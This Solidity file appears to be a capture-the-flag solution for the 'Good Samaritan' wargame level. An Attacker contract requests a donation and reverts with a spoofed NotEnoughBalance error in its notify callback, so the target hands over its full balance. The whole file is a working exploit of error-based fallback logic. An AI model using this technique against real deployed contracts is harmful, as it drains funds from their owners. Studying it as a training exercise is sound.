
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "../lv27_good_samaritan.sol";


contract Attacker is INotifyable {
    error NotEnoughBalance();

    GoodSamaritan gs;
    constructor(address instance_ad) {
        gs = GoodSamaritan(instance_ad);
    }


    function attack() external {
        gs.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }


    

}
